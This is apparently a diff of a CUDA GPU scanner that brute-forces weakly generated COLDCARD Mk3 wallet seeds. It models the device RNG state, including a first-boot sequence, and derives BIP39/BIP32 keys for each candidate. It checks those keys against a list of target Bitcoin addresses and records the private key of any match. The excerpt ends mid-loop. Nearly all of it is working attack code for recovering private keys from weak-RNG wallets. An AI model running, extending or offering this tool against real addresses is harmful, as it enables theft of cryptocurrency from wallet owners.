@@ -1,12 +1,16 @@
-// cscan - COLDCARD Mk3 weak-seed CUDA scanner.
+// cscan - COLDCARD Mk3 weak-RNG CUDA scanner.
 // Port of the validated Metal kernel (gpu/metal). One thread = one
-// (pad, skip) candidate: yasmarang raw -> SHA256 -> BIP39 sentence ->
+// (pad, chip skip, mixer skip) candidate: yasmarang raw -> SHA256 -> BIP39 sentence ->
 // PBKDF2-HMAC-SHA512 -> BIP32 m/84'/0'/0'/0/idx -> hash160 -> match.
 // Build: nvcc -O3 -arch=sm_89 scan.cu -o cscan   (sm_80 for 3090)
 #include <cstdio>
 #include <cstdlib>
 #include <cstring>
 #include <cstdint>
+#include <cerrno>
+#include <climits>
+#include <fcntl.h>
+#include <sys/stat.h>
 #include <unistd.h>
 #include <time.h>
 #include <string>
@@ -19,7 +23,17 @@ typedef uint32_t uint;
 typedef uint64_t ulong;
 
 #define CUDA_CHECK(x) do { cudaError_t e = (x); if (e != cudaSuccess) { \
-    fprintf(stderr, "CUDA error %s at %s:%d\n", cudaGetErrorString(e), __FILE__, __LINE__); exit(1);} } while (0)
+    fprintf(stderr, "CUDA error %s at %s:%d\n", cudaGetErrorString(e), __FILE__, __LINE__); exit(3);} } while (0)
+
+__device__ __forceinline__ void wipeDevice(void *ptr, size_t len) {
+    volatile uchar *p = static_cast<volatile uchar *>(ptr);
+    for (size_t i = 0; i < len; i++) p[i] = 0;
+}
+
+static void wipeHost(void *ptr, size_t len) {
+    volatile uchar *p = static_cast<volatile uchar *>(ptr);
+    for (size_t i = 0; i < len; i++) p[i] = 0;
+}
 
 // ---------------- yasmarang ----------------
 
@@ -35,20 +49,92 @@ __device__ inline uint yasNext(Yas &y) {
 }
 
 // raw[0..7] = chip^mixer words. chip = {pad, rtcTR, rtcSSR, 0}; chip advanced
-// by skip; mixer = {0x0A8CE26F, 69, 233, 0} advanced by mixerSkip (lockstep
-// model: skip == mixerSkip). false if on-device fatal (chip==last).
+// by chipSkip; mixer = {0x0A8CE26F, 69, 233, 0} advanced independently.
+// False if on-device fatal (chip==last).
 __device__ inline bool rngRawHP(uint pad32, uint rtcTR, uint rtcSSR,
-                                int skip, int mixerSkip, uint raw[8]) {
+                                 uint chipSkip, uint mixerSkip, uint raw[8]) {
     Yas c = {pad32, rtcTR, rtcSSR, 0u};
-    for (int i = 0; i < skip; i++) yasNext(c);
+    for (uint i = 0; i < chipSkip; i++) yasNext(c);
     Yas m = {0x0A8CE26Fu, 69u, 233u, 0u};
-    for (int i = 0; i < mixerSkip; i++) yasNext(m);
+    for (uint i = 0; i < mixerSkip; i++) yasNext(m);
     uint last = 0;
     for (int i = 0; i < 8; i++) {
         uint cv = yasNext(c);
-        if (i > 0 && cv == last) return false;
+        if (cv == last) return false;
         last = cv;
         raw[i] = cv ^ yasNext(m);
+    }
+    return true;
+}
+
+__device__ inline uint countedNext(Yas &state, uint &draws) {
+    draws++;
+    return yasNext(state);
+}
+
+// Exact external/libngu/ngu/random.c::_rand_below(). Rejections advance only
+// the fixed libngu mixer, which makes the final mixer state pad-dependent.
+__device__ inline uint randBelow(Yas &chip, Yas &mixer, uint maximum,
+                                 uint &chipDraws, uint &mixerDraws) {
+    if (maximum <= 1) return 0;
+    uint bitLength = 1;
+    while (maximum >> bitLength) bitLength++;
+    uint mask = (2u << bitLength) - 1u;
+    uint point = countedNext(mixer, mixerDraws) ^ countedNext(chip, chipDraws);
+    while (true) {
+        uint value = point & mask;
+        if (value < maximum) return value;
+        point ^= countedNext(mixer, mixerDraws);
+    }
+}
+
+__device__ inline void shuffleDraws(Yas &chip, Yas &mixer, uint length,
+                                    uint &chipDraws, uint &mixerDraws) {
+    for (uint index = length - 1; index > 0; index--)
+        randBelow(chip, mixer, index + 1, chipDraws, mixerDraws);
+}
+
+// Advance one my_random_bytes() call while preserving its continuous test.
+__device__ inline bool discardRandomWords(Yas &chip, Yas &mixer, uint words,
+                                          uint &chipDraws, uint &mixerDraws) {
+    uint last = 0;
+    for (uint index = 0; index < words; index++) {
+        uint chipWord = countedNext(chip, chipDraws);
+        if (chipWord == last) return false;
+        last = chipWord;
+        countedNext(mixer, mixerDraws);
+    }
+    return true;
+}
+
+// Physical fresh-device flow before make_new_wallet(): initial 32-slot shuffle,
+// 3 x 4 KiB noise writes, keypad sessions before Terms save, first settings
+// save (another 32-slot shuffle), then keypad sessions before seed generation.
+__device__ inline bool rngRawFirstBoot(uint pad32, uint rtcTR, uint rtcSSR,
+                                      uint preTermsSessions, uint postTermsSessions,
+                                      uint raw[8], uint &chipSkip, uint &mixerSkip) {
+    Yas chip = {pad32, rtcTR, rtcSSR, 0u};
+    Yas mixer = {0x0A8CE26Fu, 69u, 233u, 0u};
+    uint chipDraws = 0, mixerDraws = 0;
+
+    shuffleDraws(chip, mixer, 32, chipDraws, mixerDraws);
+    for (uint call = 0; call < 48; call++) {
+        if (!discardRandomWords(chip, mixer, 64, chipDraws, mixerDraws)) return false;
+    }
+    for (uint session = 0; session < preTermsSessions; session++)
+        shuffleDraws(chip, mixer, 4, chipDraws, mixerDraws);
+    shuffleDraws(chip, mixer, 32, chipDraws, mixerDraws);
+    for (uint session = 0; session < postTermsSessions; session++)
+        shuffleDraws(chip, mixer, 4, chipDraws, mixerDraws);
+
+    chipSkip = chipDraws;
+    mixerSkip = mixerDraws;
+    uint last = 0;
+    for (int index = 0; index < 8; index++) {
+        uint chipWord = countedNext(chip, chipDraws);
+        if (chipWord == last) return false;
+        last = chipWord;
+        raw[index] = chipWord ^ countedNext(mixer, mixerDraws);
     }
     return true;
 }
@@ -149,14 +235,16 @@ __device__ inline void sha512Final(Sha512 &s, uchar out[64]) {
 
 __device__ inline void sha512once(const uchar *data, uint len, uchar out[64]) {
     Sha512 s; sha512Init(s); sha512Update(s, data, len); sha512Final(s, out);
+    wipeDevice(&s, sizeof(s));
 }
 
 // PBKDF2-HMAC-SHA512, dkLen 64, salt "mnemonic", cached pads.
 __device__ inline void pbkdf2Bip39(const uchar *pw, uint pwlen, uchar out[64]) {
     uchar kblock[128];
+    uchar kh[64] = {0};
     for (int i = 0; i < 128; i++) kblock[i] = 0;
     if (pwlen > 128) {
-        uchar kh[64]; sha512once(pw, pwlen, kh);
+        sha512once(pw, pwlen, kh);
         for (int i = 0; i < 64; i++) kblock[i] = kh[i];
     } else {
         for (uint i = 0; i < pwlen; i++) kblock[i] = pw[i];
@@ -179,6 +267,15 @@ __device__ inline void pbkdf2Bip39(const uchar *pw, uint pwlen, uchar out[64]) {
         for (int i = 0; i < 64; i++) t[i] ^= u[i];
     }
     for (int i = 0; i < 64; i++) out[i] = t[i];
+    wipeDevice(kblock, sizeof(kblock));
+    wipeDevice(kh, sizeof(kh));
+    wipeDevice(pad, sizeof(pad));
+    wipeDevice(&ictx, sizeof(ictx));
+    wipeDevice(&octx, sizeof(octx));
+    wipeDevice(&s, sizeof(s));
+    wipeDevice(saltblk, sizeof(saltblk));
+    wipeDevice(u, sizeof(u));
+    wipeDevice(t, sizeof(t));
 }
 
 // ---------------- SHA-256 + RIPEMD-160 ----------------
@@ -641,9 +738,10 @@ __device__ inline void scalarAddModN(uchar k[32], const uchar il[32]) {
 __device__ inline void hmacSha512(const uchar *key, uint klen,
                                   const uchar *msg, uint mlen, uchar out[64]) {
     uchar kblock[128];
+    uchar kh[64] = {0};
     for (int i = 0; i < 128; i++) kblock[i] = 0;
     if (klen > 128) {
-        uchar kh[64]; sha512once(key, klen, kh);
+        sha512once(key, klen, kh);
         for (int i = 0; i < 64; i++) kblock[i] = kh[i];
     } else {
         for (uint i = 0; i < klen; i++) kblock[i] = key[i];
@@ -656,6 +754,11 @@ __device__ inline void hmacSha512(const uchar *key, uint klen,
     for (int i = 0; i < 128; i++) pad[i] = kblock[i] ^ 0x5c;
     sha512Init(s); sha512Update(s, pad, 128); sha512Update(s, ih, 64);
     sha512Final(s, out);
+    wipeDevice(kblock, sizeof(kblock));
+    wipeDevice(kh, sizeof(kh));
+    wipeDevice(pad, sizeof(pad));
+    wipeDevice(&s, sizeof(s));
+    wipeDevice(ih, sizeof(ih));
 }
 
 // entropy(32) -> 24-word sentence; words8 = 2048 slots x 8 bytes zero-padded
@@ -677,6 +780,7 @@ __device__ inline void entropyToSentence(const uchar ent[32], const uchar *words
         const uchar *wp = words8 + idx * 8;
         for (int i = 0; i < 8 && wp[i]; i++) out[outLen++] = wp[i];
     }
+    wipeDevice(csh, sizeof(csh));
 }
 
 struct EKey { uchar key[32]; uchar cc[32]; };
@@ -687,6 +791,8 @@ __device__ inline EKey masterFromSeed(const uchar seed[64]) {
     hmacSha512(ks, 12, seed, 64, I);
     EKey k;
     for (int i = 0; i < 32; i++) { k.key[i] = I[i]; k.cc[i] = I[32 + i]; }
+    wipeDevice(I, sizeof(I));
+    wipeDevice(ks, sizeof(ks));
     return k;
 }
 
@@ -700,6 +806,7 @@ __device__ inline EKey ckdPriv(const EKey &par, uint index, const Pt *gtab) {
     } else {
         Pt p; mulGTable(p, par.key, gtab);
         ptSerialize(p, data);
+        wipeDevice(&p, sizeof(p));
         dlen = 33;
     }
     for (int i = 0; i < 4; i++) data[dlen + i] = uchar(index >> (24 - 8 * i));
@@ -711,6 +818,9 @@ __device__ inline EKey ckdPriv(const EKey &par, uint index, const Pt *gtab) {
     uchar il[32];
     for (int i = 0; i < 32; i++) il[i] = I[i];
     scalarAddModN(c.key, il);
+    wipeDevice(data, sizeof(data));
+    wipeDevice(I, sizeof(I));
+    wipeDevice(il, sizeof(il));
     return c;
 }
 
@@ -730,8 +840,18 @@ __device__ inline bool targetHit(const uchar *targets, uint count, const uchar h
     return false;
 }
 
-struct Params { ulong padStart; uint skipMax, idxMax, targetCount, rtcTR, rtcSSR, skipBase, lockstep; };
-struct Hit { uint pad, skip, idx; uchar priv[32]; uchar h160[20]; };
+struct Params {
+    ulong padStart, candidateStart, candidateCount, combinationsPerPad;
+    uint chipSkipBase, chipSkipCount, mixerSkipBase, mixerSkipCount;
+    uint idxMax, targetCount, rtcTR, rtcSSR, lockstep;
+    uint firstBoot, preTermsSessions, postTermsBase, postTermsCount;
+};
+struct Hit {
+    uint pad, chipSkip, mixerSkip, idx;
+    uint preTermsSessions, postTermsSessions;
+    uchar priv[32];
+    uchar h160[20];
+};
 
 // one-time G doublings table (thread 0)
 __global__ void setupG(Pt *table) {
@@ -755,11 +875,23 @@ __global__ void setupG(Pt *table) {
 }
 
 // debug: print every chain stage for one known candidate
-__global__ void debugCandidate(uint pad, uint skip, uint rtcTR, uint rtcSSR,
+__global__ void debugCandidate(uint pad, uint chipSkip, uint mixerSkip,
+                               uint rtcTR, uint rtcSSR, uint firstBoot,
+                               uint preTermsSessions, uint postTermsSessions,
                                const uchar *words8, const Pt *gtab) {
     uint raw[8];
-    bool ok = rngRawHP(pad, rtcTR, rtcSSR, (int)skip, 0, raw);
-    printf("ok=%d rawB=", (int)ok);
+    bool ok;
+    if (firstBoot) {
+        ok = rngRawFirstBoot(pad, rtcTR, rtcSSR, preTermsSessions,
+                             postTermsSessions, raw, chipSkip, mixerSkip);
+        printf("flow=firstboot preTerms=%u postTerms=%u chipSkip=%u mixerSkip=%u\n",
+               preTermsSessions, postTermsSessions, chipSkip, mixerSkip);
+    } else {
+        ok = rngRawHP(pad, rtcTR, rtcSSR, chipSkip, mixerSkip, raw);
+    }
+    printf("ok=%d", (int)ok);
+    if (!ok) { wipeDevice(raw, sizeof(raw)); printf("\n"); return; }
+    printf(" rawB=");
     uchar rawB[32];
     for (int i = 0; i < 8; i++) {
         rawB[i*4+0] = uchar(raw[i]);
@@ -780,14 +912,14 @@ __global__ void debugCandidate(uint pad, uint skip, uint rtcTR, uint rtcSSR,
     pbkdf2Bip39(sentence, slen, seed);
     printf("\nseed16=");
     for (int i = 0; i < 16; i++) printf("%02x", seed[i]);
-    EKey acct = ckdPriv(ckdPriv(ckdPriv(masterFromSeed(seed), 84u|0x80000000u, gtab), 0u|0x80000000u, gtab), 0u|0x80000000u, gtab);
-    {
-        EKey ms = masterFromSeed(seed);
-        printf("\nmaster=");
-        for (int i = 0; i < 32; i++) printf("%02x", ms.key[i]);
-        printf("\nmaster_cc=");
-        for (int i = 0; i < 32; i++) printf("%02x", ms.cc[i]);
-    }
+    EKey master = masterFromSeed(seed);
+    printf("\nmaster=");
+    for (int i = 0; i < 32; i++) printf("%02x", master.key[i]);
+    printf("\nmaster_cc=");
+    for (int i = 0; i < 32; i++) printf("%02x", master.cc[i]);
+    EKey purpose = ckdPriv(master, 84u|0x80000000u, gtab);
+    EKey coin = ckdPriv(purpose, 0u|0x80000000u, gtab);
+    EKey acct = ckdPriv(coin, 0u|0x80000000u, gtab);
     printf("\nacct=");
     for (int i = 0; i < 32; i++) printf("%02x", acct.key[i]);
     EKey ext  = ckdPriv(acct, 0u, gtab);
@@ -802,17 +934,53 @@ __global__ void debugCandidate(uint pad, uint skip, uint rtcTR, uint rtcSSR,
     printf("\nh160=");
     for (int i = 0; i < 20; i++) printf("%02x", h[i]);
     printf("\n");
+    wipeDevice(raw, sizeof(raw));
+    wipeDevice(rawB, sizeof(rawB));
+    wipeDevice(ent, sizeof(ent));
+    wipeDevice(sentence, sizeof(sentence));
+    wipeDevice(seed, sizeof(seed));
+    wipeDevice(&master, sizeof(master));
+    wipeDevice(&purpose, sizeof(purpose));
+    wipeDevice(&coin, sizeof(coin));
+    wipeDevice(&acct, sizeof(acct));
+    wipeDevice(&ext, sizeof(ext));
+    wipeDevice(&leaf, sizeof(leaf));
+    wipeDevice(&pub, sizeof(pub));
+    wipeDevice(ser, sizeof(ser));
+    wipeDevice(h, sizeof(h));
 }
 
-// one thread = one (pad, skip) candidate
+// One thread = one point in pad x chip-skip x mixer-skip space.
 __global__ void scanKernel(const uchar *targets, const uchar *words8,
                            Hit *hits, uint *hitCnt, Params P, const Pt *gtab) {
-    ulong gid = ulong(blockIdx.x) * blockDim.x + threadIdx.x;
-    uint pad  = uint(P.padStart) + uint(gid / P.skipMax);
-    uint skip = P.skipBase + uint(gid % P.skipMax);
+    ulong local = ulong(blockIdx.x) * blockDim.x + threadIdx.x;
+    if (local >= P.candidateCount) return;
+
+    ulong candidate = P.candidateStart + local;
+    ulong combo = candidate % P.combinationsPerPad;
+    uint pad = uint(P.padStart + candidate / P.combinationsPerPad);
+    uint chipSkip = 0, mixerSkip = 0;
+    uint preTermsSessions = 0, postTermsSessions = 0;
+    if (P.firstBoot) {
+        preTermsSessions = P.preTermsSessions;
+        postTermsSessions = P.postTermsBase + uint(combo);
+    } else if (P.lockstep) {
+        chipSkip = P.chipSkipBase + uint(combo);
+        mixerSkip = chipSkip;
+    } else {
+        chipSkip = P.chipSkipBase + uint(combo / P.mixerSkipCount);
+        mixerSkip = P.mixerSkipBase + uint(combo % P.mixerSkipCount);
+    }
 
     uint raw[8];
-    if (!rngRawHP(pad, P.rtcTR, P.rtcSSR, int(skip), P.lockstep ? int(skip) : 0, raw)) return;
+    bool rngOk = P.firstBoot
+        ? rngRawFirstBoot(pad, P.rtcTR, P.rtcSSR, preTermsSessions,
+                          postTermsSessions, raw, chipSkip, mixerSkip)
+        : rngRawHP(pad, P.rtcTR, P.rtcSSR, chipSkip, mixerSkip, raw);
+    if (!rngOk) {
+        wipeDevice(raw, sizeof(raw));
+        return;
+    }
 
     uchar rawB[32];
     for (int i = 0; i < 8; i++) {
@@ -830,7 +998,10 @@ __global__ void scanKernel(const uchar *targets, const uchar *words8,
     uchar seed[64];
     pbkdf2Bip39(sentence, slen, seed);
 
-    EKey acct = ckdPriv(ckdPriv(ckdPriv(masterFromSeed(seed), 84u|0x80000000u, gtab), 0u|0x80000000u, gtab), 0u|0x80000000u, gtab);
+    EKey master = masterFromSeed(seed);
+    EKey purpose = ckdPriv(master, 84u|0x80000000u, gtab);
+    EKey coin = ckdPriv(purpose, 0u|0x80000000u, gtab);
+    EKey acct = ckdPriv(coin, 0u|0x80000000u, gtab);
     EKey ext  = ckdPriv(acct, 0u, gtab);
 
     for (uint idx = 0; idx < P.idxMax; idx++) {
@@ -838,31 +1009,56 @@ __global__ void scanKernel(const uchar *targets, const uchar *words8,
         Pt pub; mulGTable(pub, leaf.key, gtab);
         uchar ser[33]; ptSerialize(pub, ser);
         uchar h[20]; hash160(ser, 33, h);
-        if (P.padStart == 3547156718UL && gid == 4003UL && idx == 0) {
-            printf("DBG pad=%u skip=%u rtc=%u/%u h=", pad, skip, P.rtcTR, P.rtcSSR);
-            for (int j = 0; j < 20; j++) printf("%02x", h[j]);
-            printf("\n");
-        }
         if (targetHit(targets, P.targetCount, h)) {
             uint slot = atomicAdd(hitCnt, 1u);
             if (slot < 1024u) {
                 hits[slot].pad = pad;
-                hits[slot].skip = skip;
+                hits[slot].chipSkip = chipSkip;
+                hits[slot].mixerSkip = mixerSkip;
                 hits[slot].idx = idx;
+                hits[slot].preTermsSessions = preTermsSessions;
+                hits[slot].postTermsSessions = postTermsSessions;
                 for (int i = 0; i < 32; i++) hits[slot].priv[i] = leaf.key[i];
                 for (int i = 0; i < 20; i++) hits[slot].h160[i] = h[i];
             }
         }
+        wipeDevice(&leaf, sizeof(leaf));
+        wipeDevice(&pub, sizeof(pub));
+        wipeDevice(ser, sizeof(ser));
+        wipeDevice(h, sizeof(h));
     }
+    wipeDevice(raw, sizeof(raw));
+    wipeDevice(rawB, sizeof(rawB));
+    wipeDevice(ent, sizeof(ent));
+    wipeDevice(sentence, sizeof(sentence));
+    wipeDevice(seed, sizeof(seed));
+    wipeDevice(&master, sizeof(master));
+    wipeDevice(&purpose, sizeof(purpose));
+    wipeDevice(&coin, sizeof(coin));
+    wipeDevice(&acct, sizeof(acct));
+    wipeDevice(&ext, sizeof(ext));
 }
 
 // ---------------- host ----------------
 
 static const char *CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l";
 
+static uint bech32Polymod(const int *values, int count) {
+    static const uint GEN[5] = {0x3b6a57b2u, 0x26508e6du, 0x1ea119fau, 0x3d4233ddu, 0x2a1462b3u};
+    uint chk = 1;
+    for (int n = 0; n < count; n++) {
+        uint top = chk >> 25;
+        chk = ((chk & 0x1ffffffu) << 5) ^ uint(values[n]);
+        for (int i = 0; i < 5; i++) if ((top >> i) & 1u) chk ^= GEN[i];
+    }
+    return chk;
+}
+
 static int bech32Prog(const char *addr, uchar out[20]) {
+    size_t addrLen = strlen(addr);
+    if (addrLen != 42 || addr[0] != 'b' || addr[1] != 'c' || addr[2] != '1') return -1;
     const char *sep = strrchr(addr, '1');
-    if (!sep || sep == addr) return -1;
+    if (sep != addr + 2) return -1;
     int vals[64], n = 0;
     for (const char *p = sep + 1; *p && n < 64; p++) {
         const char *c = strchr(CHARSET, *p);
@@ -870,13 +1066,23 @@ static int bech32Prog(const char *addr, uchar out[20]) {
         vals[n++] = (int)(c - CHARSET);
     }
     if (n < 7 || vals[0] != 0) return -1;
-    int acc = 0, bits = 0, olen = 0;
+    int checksumInput[5 + 64] = {3, 3, 0, 2, 3}; // HRP expansion for "bc"
+    for (int i = 0; i < n; i++) checksumInput[5 + i] = vals[i];
+    if (bech32Polymod(checksumInput, 5 + n) != 1u) return -1;
+    uint acc = 0;
+    int bits = 0, olen = 0;
     for (int i = 1; i < n - 6; i++) {
         acc = (acc << 5) | vals[i];
         bits += 5;
-        if (bits >= 8) { bits -= 8; if (olen >= 20) return -1; out[olen++] = (acc >> bits) & 0xFF; }
+        if (bits >= 8) {
+            bits -= 8;
+            if (olen >= 20) return -1;
+            out[olen++] = (acc >> bits) & 0xFF;
+            acc &= bits ? ((1u << bits) - 1u) : 0u;
+        }
     }
-    return olen == 20 ? 0 : -1;
+    if (olen != 20 || bits >= 5 || (bits && acc)) return -1;
+    return 0;
 }
 
 static std::string readFile(const char *path) {
@@ -884,7 +1090,10 @@ static std::string readFile(const char *path) {
     if (!f) { fprintf(stderr, "cannot open %s\n", path); exit(1); }
     fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
     std::string s(sz, 0);
-    fread(&s[0], 1, sz, f); fclose(f);
+    if (sz && fread(&s[0], 1, sz, f) != size_t(sz)) {
+        fprintf(stderr, "short read: %s\n", path); fclose(f); exit(1);
+    }
+    fclose(f);
     return s;
 }
 
@@ -893,30 +1102,76 @@ static double nowSec() {
     return t.tv_sec + 1e-9 * t.tv_nsec;
 }
 
+static bool parseU64(const char *text, ulong max, ulong &out) {
+    if (!text || !*text || *text == '-') return false;
+    errno = 0;
+    char *end = nullptr;
+    unsigned long long value = strtoull(text, &end, 0);
+    if (errno || !end || *end || value > max) return false;
+    out = ulong(value);
+    return true;
+}
+
 int main(int argc, char **argv) {
     const char *targetsF = nullptr, *wordsF = "bip39_english.txt", *outF = "hits_gpu.json";
-    uint rtcTR = 0, rtcSSR = 0, skipMax = 8, idxMax = 16, skipBase = 0, lockstep = 0;
+    uint rtcTR = 0, rtcSSR = 0, chipSkipCount = 8, idxMax = 16, chipSkipBase = 0;
+    uint mixerSkipBase = 0, mixerSkipCount = 1, lockstep = 0;
+    uint preTermsSessions = 2, postTermsBase = 0, postTermsCount = 1;
     ulong padStart = 0, padEnd = 1ULL << 32, batchThreads = 1u << 22;
     ulong debugPad = 0;
+    bool debug = false, mixerConfigured = false, chipConfigured = false;
+    bool firstBoot = false, postTermsConfigured = false;
     int opt;
-    while ((opt = getopt(argc, argv, "t:w:r:s:k:i:p:b:o:D:B:e:M:")) != -1) {
+    while ((opt = getopt(argc, argv, "t:w:r:s:k:i:p:b:o:D:B:e:M:m:K:F:A:C:")) != -1) {
+        ulong value = 0;
         switch (opt) {
-        case 'D': debugPad = strtoull(optarg, NULL, 0); break;
-        case 'B': skipBase = (uint)strtoul(optarg, NULL, 0); break;
-        case 'e': padEnd = strtoull(optarg, NULL, 0); break;
-        case 'M': lockstep = (uint)strtoul(optarg, NULL, 0); break;
+        case 'D': if (!parseU64(optarg, UINT32_MAX, value)) goto bad_number; debugPad = value; debug = true; break;
+        case 'B': if (!parseU64(optarg, UINT32_MAX, value)) goto bad_number; chipSkipBase = uint(value); chipConfigured = true; break;
+        case 'e': if (!parseU64(optarg, 1ULL << 32, value)) goto bad_number; padEnd = value; break;
+        case 'M': if (!parseU64(optarg, UINT32_MAX, value)) goto bad_number; lockstep = uint(value); break;
+        case 'm': if (!parseU64(optarg, UINT32_MAX, value)) goto bad_number; mixerSkipBase = uint(value); mixerConfigured = true; break;
+        case 'K': if (!parseU64(optarg, UINT32_MAX, value)) goto bad_number; mixerSkipCount = uint(value); mixerConfigured = true; break;
+        case 'F': if (!parseU64(optarg, UINT32_MAX, value)) goto bad_number; preTermsSessions = uint(value); firstBoot = true; break;
+        case 'A': if (!parseU64(optarg, UINT32_MAX, value)) goto bad_number; postTermsBase = uint(value); postTermsConfigured = true; break;
+        case 'C': if (!parseU64(optarg, UINT32_MAX, value)) goto bad_number; postTermsCount = uint(value); postTermsConfigured = true; break;
         case 't': targetsF = optarg; break;
         case 'w': wordsF = optarg; break;
-        case 'r': rtcTR = (uint)strtoul(optarg, NULL, 0); break;
-        case 's': rtcSSR = (uint)strtoul(optarg, NULL, 0); break;
-        case 'k': skipMax = (uint)strtoul(optarg, NULL, 0); break;
-        case 'i': idxMax = (uint)strtoul(optarg, NULL, 0); break;
-        case 'p': padStart = strtoull(optarg, NULL, 0); break;
-        case 'b': batchThreads = strtoull(optarg, NULL, 0); break;
+        case 'r': if (!parseU64(optarg, UINT32_MAX, value)) goto bad_number; rtcTR = uint(value); break;
+        case 's': if (!parseU64(optarg, UINT32_MAX, value)) goto bad_number; rtcSSR = uint(value); break;
+        case 'k': if (!parseU64(optarg, UINT32_MAX, value)) goto bad_number; chipSkipCount = uint(value); chipConfigured = true; break;
+        case 'i': if (!parseU64(optarg, UINT32_MAX, value)) goto bad_number; idxMax = uint(value); break;
+        case 'p': if (!parseU64(optarg, 1ULL << 32, value)) goto bad_number; padStart = value; break;
+        case 'b': if (!parseU64(optarg, UINT64_MAX, value)) goto bad_number; batchThreads = value; break;
         case 'o': outF = optarg; break;
         }
+        continue;
+bad_number:
+        fprintf(stderr, "invalid numeric value for -%c: %s\n", opt, optarg);
+        return 2;
     }
     if (!targetsF) { fprintf(stderr, "-t targets.txt required\n"); return 2; }
+    if (!chipSkipCount || !mixerSkipCount || !postTermsCount || !idxMax || !batchThreads) {
+        fprintf(stderr, "range counts, index count, and batch size must be nonzero\n"); return 2;
+    }
+    if (padStart >= padEnd || padEnd > (1ULL << 32)) {
+        fprintf(stderr, "pad range must satisfy 0 <= start < end <= 2^32\n"); return 2;
+    }
+    if (ulong(chipSkipBase) + chipSkipCount > (1ULL << 32) ||
+        ulong(mixerSkipBase) + mixerSkipCount > (1ULL << 32)) {
+        fprintf(stderr, "skip range exceeds uint32\n"); return 2;
+    }
+    if (lockstep && mixerConfigured) {
+        fprintf(stderr, "-M lockstep cannot be combined with -m/-K independent mixer range\n"); return 2;
+    }
+    if (firstBoot && (chipConfigured || mixerConfigured || lockstep)) {
+        fprintf(stderr, "-F firstboot cannot be combined with -B/-k/-m/-K/-M fixed skips\n"); return 2;
+    }
+    if (!firstBoot && postTermsConfigured) {
+        fprintf(stderr, "-A/-C require -F firstboot\n"); return 2;
+    }
+    if (firstBoot && (ulong(postTermsBase) + postTermsCount > (1ULL << 32))) {
+        fprintf(stderr, "post-Terms session range exceeds uint32\n"); return 2;
+    }
 
     // targets -> sorted 20-byte progs
     std::vector<std::array<uchar, 20>> progs;
@@ -932,6 +1187,7 @@ int main(int argc, char **argv) {
         free(copy);
     }
     uint tcount = (uint)progs.size();
+    if (!tcount) { fprintf(stderr, "no valid targets loaded\n"); return 2; }
     std::sort(progs.begin(), progs.end());
     fprintf(stderr, "[cscan] %u targets loaded\n", tcount);
 
@@ -963,62 +1219,132 @@ int main(int argc, char **argv) {
     setupG<<<1, 1>>>(dG);
     CUDA_CHECK(cudaDeviceSynchronize());
 
-    if (debugPad) {
-        debugCandidate<<<1, 1>>>((uint)debugPad, skipMax, rtcTR, rtcSSR, dWords, dG);
+    if (debug) {
+        uint debugMixerSkip = lockstep ? chipSkipBase : mixerSkipBase;
+        debugCandidate<<<1, 1>>>((uint)debugPad, chipSkipBase, debugMixerSkip,
+                                 rtcTR, rtcSSR, firstBoot ? 1u : 0u,
+                                 preTermsSessions, postTermsBase, dWords, dG);
+        CUDA_CHECK(cudaGetLastError());
         CUDA_CHECK(cudaDeviceSynchronize());
         return 0;
     }
 
     fprintf(stderr, "[cscan] G table ready\n");
 
-    ulong batchPads = batchThreads / skipMax;
-    if (!batchPads) batchPads = 1;
-    fprintf(stderr, "[cscan] rtc=%u/%u skipMax=%u idxMax=%u batch=%llu pads (%llu threads)\n",
-            rtcTR, rtcSSR, skipMax, idxMax, batchPads, batchPads * skipMax);
+    ulong combinationsPerPad = firstBoot
+        ? ulong(postTermsCount)
+        : (lockstep
+            ? ulong(chipSkipCount)
+            : ulong(chipSkipCount) * ulong(mixerSkipCount));
+    ulong padCount = padEnd - padStart;
+    if (combinationsPerPad > UINT64_MAX / padCount) {
+        fprintf(stderr, "candidate space exceeds uint64\n"); return 2;
+    }
+    ulong totalCandidates = padCount * combinationsPerPad;
+    if (firstBoot) {
+        fprintf(stderr,
+                "[cscan] rtc=%u/%u flow=firstboot preTerms=%u postTerms=[%u,%llu) idxMax=%u pads=%llu candidates=%llu\n",
+                rtcTR, rtcSSR, preTermsSessions, postTermsBase,
+                ulong(postTermsBase) + postTermsCount, idxMax, padCount, totalCandidates);
+    } else {
+        fprintf(stderr,
+                "[cscan] rtc=%u/%u chip=[%u,%llu) mixer=%s idxMax=%u pads=%llu candidates=%llu\n",
+                rtcTR, rtcSSR, chipSkipBase, ulong(chipSkipBase) + chipSkipCount,
+                lockstep ? "lockstep" : "independent", idxMax, padCount, totalCandidates);
+    }
+    if (!firstBoot && !lockstep) {
+        fprintf(stderr, "[cscan] mixer=[%u,%llu) batch=%llu threads\n",
+                mixerSkipBase, ulong(mixerSkipBase) + mixerSkipCount, batchThreads);
+    }
+
+    uint block = 256;
+    int device = 0;
+    cudaDeviceProp props;
+    CUDA_CHECK(cudaGetDevice(&device));
+    CUDA_CHECK(cudaGetDeviceProperties(&props, device));
+    ulong maxBatchThreads = ulong(props.maxGridSize[0]) * block;
+    if (batchThreads > maxBatchThreads) batchThreads = maxBatchThreads;
 
     double t0 = nowSec(), elapsed0 = 0;
-    ulong done = 0;
-    for (ulong base = padStart; base < padEnd; base += batchPads) {
-        Params P = { base, skipMax, idxMax, tcount, rtcTR, rtcSSR, skipBase, lockstep };
+    for (ulong candidateStart = 0; candidateStart < totalCandidates; ) {
+        ulong threads = std::min(batchThreads, totalCandidates - candidateStart);
+        Params P = {
+            padStart, candidateStart, threads, combinationsPerPad,
+            chipSkipBase, chipSkipCount, mixerSkipBase, mixerSkipCount,
+            idxMax, tcount, rtcTR, rtcSSR, lockstep,
+            firstBoot ? 1u : 0u, preTermsSessions, postTermsBase, postTermsCount
+        };
         CUDA_CHECK(cudaMemset(dCnt, 0, 4));
-        ulong threads = batchPads * skipMax;
-        uint block = 256;
-        ulong grid = (threads + block - 1) / block;
+        uint grid = uint((threads + block - 1) / block);
         scanKernel<<<grid, block>>>(dTargets, dWords, dHits, dCnt, P, dG);
+        CUDA_CHECK(cudaGetLastError());
         CUDA_CHECK(cudaDeviceSynchronize());
         uint hits;
         CUDA_CHECK(cudaMemcpy(&hits, dCnt, 4, cudaMemcpyDeviceToHost));
         double dt = nowSec() - t0;
         double batchDt = dt - elapsed0; elapsed0 = dt;
-        done += batchPads;
+        ulong done = candidateStart + threads;
         double rate = done / dt;
-        double remain = ((double)padEnd - padStart) - done;
